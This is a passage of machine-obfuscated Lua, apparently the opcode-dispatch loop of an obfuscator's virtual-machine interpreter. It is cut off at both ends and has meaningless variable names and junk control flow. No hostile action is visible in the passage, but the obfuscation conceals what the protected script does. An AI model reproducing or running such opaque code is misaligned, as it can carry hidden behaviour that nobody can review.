f,s;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];end end else if 279~=f then for o=16,59 do if f~=282 then c[t[e]]=h[t[n]];break;end;local f,o;c[t[e]]=(t[n]~=0);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=(t[n]~=0);r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);break;end;else local f,o;c[t[e]]=(t[n]~=0);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=(t[n]~=0);r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);end end end end else if 303<=f then if f>=309 then if 311>=f then if 310<=f then if 310<f then c[t[e]]=c[t[n]][c[t[l]]];else local l,u,a,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]];r=r+1;t=d[r];l=t[e]u,a=b(c[l](c[l+1]))o=a+l-1 f=0;for t=l,o do f=f+1;c[t]=u[f];end;r=r+1;t=d[r];l=t[e]c[l](s(c,l+1,o))r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};end else if(c[t[e]]~=t[l])then r=r+1;else r=t[n];end;end else if f>312 then if 313~=f then if(t[e]<c[t[l]])then r=r+1;else r=t[n];end;else if(c[t[e]]<c[t[l]])then r=t[n];else r=r+1;end;end else local s,f;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];r=r+1;t=d[r];c(t[e],t[n]);end end else if f<=305 then if f>=304 then if f<305 then if(c[t[e]]<=t[l])then r=r+1;else r=t[n];end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);end else local s;for f=0,4 do if 2<=f then if 3>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if f>=0 then repeat if f~=3 then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else if not c[t[e]]then r=r+1;else r=t[n];end;end end else if f~=1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else s=t[e]c[s]=c[s]()r=r+1;t=d[r];end end end end else if f<=306 then local f,h;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);else if f>307 then local f,u,k,a;for h=0,4 do if h<=1 then if h>-3 then for l=44,88 do if 0~=h then c(t[e],t[n]);r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];break;end;else c(t[e],t[n]);r=r+1;t=d[r];end else if 3>h then f=t[e]u,k=b(c[f](s(c,f+1,t[n])))o=k+f-1 a=0;for t=f,o do a=a+1;c[t]=u[a];end;r=r+1;t=d[r];else if h>0 then for a=21,85 do if h~=4 then f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];break;end;if(c[t[e]]==t[l])then r=r+1;else r=t[n];end;break;end;else f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];end end end end else local s;for f=0,4 do if f>1 then if 2<f then if 0~=f then repeat if f<4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f<1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else s=t[e]c[s]=c[s]()r=r+1;t=d[r];end end end end end end end else if 296<f then if 299>=f then if f<298 then local o=p[t[n]];local s;local f={};s=u.jYsqctPz({},{__index=function(r,t)local t=f[t];return t[1][t[2]];end,__newindex=function(c,t,r)local t=f[t]t[1][t[2]]=r;end;});for e=1,t[l]do r=r+1;local t=d[r];if t[z]==299 then f[e-1]={c,t[n]};else f[e-1]={a,t[n]};end;k[#k+1]=f;end;c[t[e]]=j(o,s,h);else if 298==f then local s,o,b,p,u,k,_,f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];f=0;while f>-1 do if f<3 then if f>0 then if 0~=f then for t=15,55 do if f~=2 then p=e;break;end;u=n;break;end;else u=n;end else b=t;end else if 4>=f then if f~=1 then for t=26,52 do if 3<f then _=b[p];break;end;k=b[u];break;end;else k=b[u];end else if 5<f then f=-2;else c(_,k);end end end f=f+1 end else local d,l,o,f,s,h;local r=0;while r>-1 do if 4<=r then if r<=5 then if r~=3 then for t=15,65 do if 4<r then h=d[l];break;end;s=f[d[o]];break;end;else h=d[l];end else if 7==r then r=-2;else c[h]=s;end end else if 1>=r then if r~=-4 then for c=20,69 do if r~=1 then d=t;break;end;l=e;break;end;else d=t;end else if r~=0 then repeat if 3~=r then o=n;break;end;f=c;until true;else f=c;end end end r=r+1 end end end else if f>300 then if f~=299 then for a=15,85 do if f>301 then local l,h,a,f;c[t[e]]=c[t[n]];r=r+1;t=d[r];l=t[e]h,a=b(c[l](c[l+1]))o=a+l-1 f=0;for t=l,o do f=f+1;c[t]=h[f];end;r=r+1;t=d[r];l=t[e]c[l](s(c,l+1,o))r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};break;end;local s,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];break;end;else local s,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];end else if(c[t[e]]<t[l])then r=r+1;else r=t[n];end;end end else if f<=293 then if 292~=f then local f,h;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=t[l];else local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])end else if 294<f then if 292~=f then for a=17,95 do if f~=295 then local s,f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];s=t[e];f=c[t[n]];c[s+1]=f;c[s]=f[t[l]];break;end;local e=t[e]local n={c[e](s(c,e+1,o))};local r=0;for t=e,t[l]do r=r+1;c[t]=n[r];end break;end;else local f,s;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];end else local f;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])r=r+1;t=d[r];do return end;end end end end end else if 336<f then if f<348 then if f>341 then if 344>=f then if 342>=f then local f,o;for h=0,4 do if h<2 then if h>-3 then repeat if h~=0 then c[t[e]]={};r=r+1;t=d[r];break;end;f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end else if h>=3 then if 3==h then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else f=t[e]c[f]=c[f](s(c,f+1,t[n]))end else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end else if f>343 then local r=t[e];do return c[r](s(c,r+1,t[n]))end;else local d=t[e];local e={};for t=1,#k do local t=k[t];for r=0,#t do local r=t[r];local n=r[1];local t=r[2];if n==c and t>=d then e[t]=n[t];r[1]=e;end;end;end;end end else if 346<=f then if f~=345 then for l=31,78 do if 347~=f then local l;for f=0,1 do if f==0 then l=t[e]c[l](c[l+1])r=r+1;t=d[r];else c[t[e]]=h[t[n]];end end break;end;c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);break;end;else local l;for f=0,1 do if f==0 then l=t[e]c[l](c[l+1])r=r+1;t=d[r];else c[t[e]]=h[t[n]];end end end else local f,o;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))end end else if f>338 then if 340<=f then if f>337 then repeat if 340~=f then c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);break;end;c[t[e]]=(t[n]~=0);until true;else c[t[e]]=(t[n]~=0);end else c[t[e]][t[n]]=t[l];end else if f~=337 then if(c[t[e]]==c[t[l]])then r=r+1;else r=t[n];end;else local f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);end end end else if 353<f then if 356<f then if f>357 then if f~=358 then local f;for l=0,4 do if 2>l then if-3~=l then repeat if 1~=l then c[t[e]]=a[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=a[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else if 2<l then if 3<l then f=t[e]c[f]=c[f](c[f+1])else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end else local f;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()end else c[t[e]]=#c[t[n]];end else if f>=355 then if f~=353 then for o=10,78 do if 356~=f then local t=t[e]c[t]=c[t](c[t+1])break;end;local f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=h[t[n]];break;end;else local f;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=h[t[n]];end else local r=t[e]c[r]=c[r](s(c,r+1,t[n]))end end else if f>350 then if f<352 then local r=t[e];do return c[r](s(c,r+1,t[n]))end;else if f>=349 then repeat if f~=353 then local f,o;f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=h[t[n]];break;end;c[t[e]]=c[t[n]][c[t[l]]];until true;else c[t[e]]=c[t[n]][c[t[l]]];end end else if f>=349 then if f==349 then local f,h,a,u,o,l,b;c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];l=0;while l>-1 do if l>=3 then if l<5 then if 2~=l then for t=33,95 do if 3~=l then o=f[h];break;end;u=f[a];break;end;else o=f[h];end else if l>2 then repeat if 6>l then c(o,u);break;end;l=-2;until true;else l=-2;end end else if l>=1 then if 1~=l then a=n;else h=e;end else f=t;end end l=l+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];l=0;while l>-1 do if l<=2 then if l>0 then if 0<l then repeat if 1~=l then a=n;break;end;h=e;until true;else h=e;end else f=t;end else if 5<=l then if 6~=l then c(o,u);else l=-2;end else if l==3 then u=f[a];else o=f[h];end end end l=l+1 end r=r+1;t=d[r];b=t[e]c[b]=c[b](s(c,b+1,t[n]))else c[t[e]]=c[t[n]]-c[t[l]];end else local f,o;c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];do return end;end end end end else if 325<f then if 331>f then if 327>=f then if 323<f then repeat if f<327 then c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];break;end;local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])until true;else local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])end else if f<329 then local s;for f=0,4 do if f>=2 then if f>=3 then if f~=1 then for h=26,61 do if f<4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;break;end;else if not c[t[e]]then r=r+1;else r=t[n];end;end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f>-4 then for l=12,65 do if f~=1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end else if f==329 then local f,o;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];else local _,k,f,p,j,u;for h=0,4 do if 2>h then if-1<h then repeat if 0~=h then _=t[n];k=c[_]for t=_+1,t[l]do k=k..c[t];end;c[t[e]]=k;r=r+1;t=d[r];break;end;c[t[e]]=a[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else if h<=2 then f=t[e]p,j=b(c[f](s(c,f+1,t[n])))o=j+f-1 u=0;for t=f,o do u=u+1;c[t]=p[u];end;r=r+1;t=d[r];else if-1<=h then for l=44,64 do if h<4 then f=t[e]c[f]=c[f](s(c,f+1,o))r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]];break;end;else f=t[e]c[f]=c[f](s(c,f+1,o))r=r+1;t=d[r];end end end end end end end else if f>=334 then if 335<=f then if f==335 then local f,h;c[t[e]]={};r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];else local f;for s=0,4 do if s>=2 then if 2<s then if s>=2 then repeat if 4>s then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;until true;else if not c[t[e]]then r=r+1;else r=t[n];end;end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if s~=-2 then repeat if 1~=s then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f]()r=r+1;t=d[r];until true;else f=t[e]c[f]=c[f]()r=r+1;t=d[r];end end end end else r=t[n];end else if f>331 then if f<333 then local f,s;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];r=r+1;t=d[r];c(t[e],t[n]);else local d=c[t[l]];if d then r=r+1;else c[t[e]]=d;r=t[n];end;end else local u,lv,rv,tv,z,lv,f,lv,lv,lv,cv,ev,lv,y,m,g,a,p,k,_,nv,dv,j;u=t[e]c[u]=c[u]()r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=0;while f>-1 do if f<3 then if f<1 then a=t;else if f~=1 then tv=n;else rv=e;end end else if f>=5 then if f>=2 then repeat if 6~=f then c(k,z);break;end;f=-2;until true;else c(k,z);end else if f~=3 then k=a[rv];else z=a[tv];end end end f=f+1 end r=r+1;t=d[r];f=0;while f>-1 do if f<=3 then if f<=1 then if 0~=f then y=e;else a=t;end else if f~=3 then m=n;else cv=c;end end else if 5>=f then if f==5 then k=a[y];else ev=cv[a[m]];end else if 4<=f then repeat if f>6 then f=-2;break;end;c[k]=ev;until true;else f=-2;end end end f=f+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=0;while f>-1 do if f>=3 then if 4<f then if f<6 then c[k]=_;else f=-2;end else if f~=-1 then repeat if f>3 then _=c[p];for t=1+p,a[g]do _=_..c[t];end;break;end;k=a[y];until true;else _=c[p];for t=1+p,a[g]do _=_..c[t];end;end end else if 0<f then if-1<f then repeat if f~=2 then a=t;break;end;p=a[m];until true;else a=t;end else y=e;m=n;g=l;end end f=f+1 end r=r+1;t=d[r];u=t[e]nv,dv=b(c[u](c[u+1]))o=dv+u-1 j=0;for t=u,o do j=j+1;c[t]=nv[j];end;r=r+1;t=d[r];u=t[e]c[u]=c[u](s(c,u+1,o))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end end end else if f>=320 then if 322>=f then if 321<=f then if 319<f then for h=24,95 do if f>321 then c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];break;end;local t=t[e]c[t]=c[t](s(c,t+1,o))break;end;else local t=t[e]c[t]=c[t](s(c,t+1,o))end else local f,u,k,_,a;f=t[e]c[f]=c[f](s(c,f+1,o))r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];u=c[t[n]];c[f+1]=u;c[f]=u[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]k,_=b(c[f](s(c,f+1,t[n])))o=_+f-1 a=0;for t=f,o do a=a+1;c[t]=k[a];end;end else if 324<=f then if 324<f then local f,u,k,_,a;f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];f=t[e];u=c[t[n]];c[f+1]=u;c[f]=u[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]];r=r+1;t=d[r];f=t[e]k,_=b(c[f](c[f+1]))o=_+f-1 a=0;for t=f,o do a=a+1;c[t]=k[a];end;r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];c[t[e]]={};else c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end else local s;for f=0,4 do if f<=1 then if f>0 then s=t[e]c[s]=c[s]()r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if f>2 then if f>=2 then for h=19,68 do if 4~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if c[t[e]]then r=r+1;else r=t[n];end;break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end else if f<317 then if 314~=f then for h=35,89 do if f<316 then local h,o,u,k,a,b,_,f;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];h=t[e]c[h](s(c,h+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];h=t[e];o=c[t[n]];c[h+1]=o;c[h]=o[t[l]];r=r+1;t=d[r];f=0;while f>-1 do if 2>=f then if f>0 then if 0<=f then repeat if f<2 then k=e;break;end;a=n;until true;else a=n;end else u=t;end else if 4<f then if 4<f then for t=29,80 do if 6>f then c(_,b);break;end;f=-2;break;end;else f=-2;end else if 3<f then _=u[k];else b=u[a];end end end f=f+1 end r=r+1;t=d[r];h=t[e]c[h](s(c,h+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];h=t[e];o=c[t[n]];c[h+1]=o;c[h]=o[t[l]];break;end;c[t[e]][t[n]]=t[l];break;end;else local h,o,a,b,u,k,_,f;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];h=t[e]c[h](s(c,h+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];h=t[e];o=c[t[n]];c[h+1]=o;c[h]=o[t[l]];r=r+1;t=d[r];f=0;while f>-1 do if 2>=f then if f>0 then if 0<=f then repeat if f<2 then b=e;break;end;u=n;until true;else u=n;end else a=t;end else if 4<f then if 4<f then for t=29,80 do if 6>f then c(_,k);break;end;f=-2;break;end;else f=-2;end else if 3<f then _=a[b];else k=a[u];end end end f=f+1 end r=r+1;t=d[r];h=t[e]c[h](s(c,h+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];h=t[e];o=c[t[n]];c[h+1]=o;c[h]=o[t[l]];end else if f>=318 then if 316<=f then repeat if 319>f then local f,o;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);break;end;local f,o;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()until true;else local 